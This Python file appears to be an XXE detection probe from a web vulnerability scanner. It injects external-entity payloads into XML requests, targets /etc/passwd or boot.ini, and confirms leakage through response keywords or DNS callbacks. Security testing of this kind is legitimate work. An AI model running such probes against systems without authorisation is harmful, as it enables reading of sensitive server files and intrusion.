"""
XXE 探针
漏洞知识: https://portswigger.net/web-security/xxe
"""

import sys
import time
import random
import os

from utils.constants import MARK_POINT
from utils.utils import get_random_str, send_request
from core.probe import Probe

def run(probe_ins: Probe) -> None:
    if probe_ins.content_type != 'xml' or MARK_POINT not in probe_ins.request['data']:
        print("[*] XXE detection skipped")
        return 
        
    vulnerable = False
    try:
        dnslog_domain = f"{get_random_str(6)}.{probe_ins.dnslog.domain}"
        for payload in probe_ins.probes_payload['xxe']:
            # 将 payload 中的占位符 filepath 和 dnslog 分别替换为平台特定文件和 dnslog 子域名
            payload = payload.replace('dnslog', dnslog_domain) \
                .replace('filepath', '/c:/boot.ini' if os.environ['platform'] == 'windows' else '/etc/passwd')

            payload_request = probe_ins.gen_payload_request('&xxe;')
            if '?>' in payload_request['data']:
                payload_request['data'] = payload_request['data'].replace('?>', f'?>{payload}')
            else:
                payload_request['data'] = payload + payload_request['data']
            if 'http' not in payload:
                # 有回显
                poc_rsp = send_request(payload_request)

                if poc_rsp.get('response') and any(kw in poc_rsp.get('response', '') for kw in ['root:', 'boot loader']):
                    vulnerable = True
            else:
                # 无回显
                _ = send_request(payload_request)
                time.sleep(random.random())

                dnslog_records = probe_ins.dnslog.pull_logs(dnslog_domain[:-3])
                if dnslog_records and dnslog_domain in str(dnslog_records):
                    vulnerable = True

            if vulnerable:
                print("[+] Found XXE!")
                probe_ins.fuzz_results.put({
                    'request': probe_ins.request,
                    'payload': payload,
                    'poc': payload_request,
                    'type': 'XXE'
                })
                break

        if not vulnerable:
            print("[-] Not Found XXE.")
    except Exception as e:
        _, _, exc_tb = sys.exc_info()
        print(f"[*] (probe:xxe) {e}:{exc_tb.tb_lineno}")
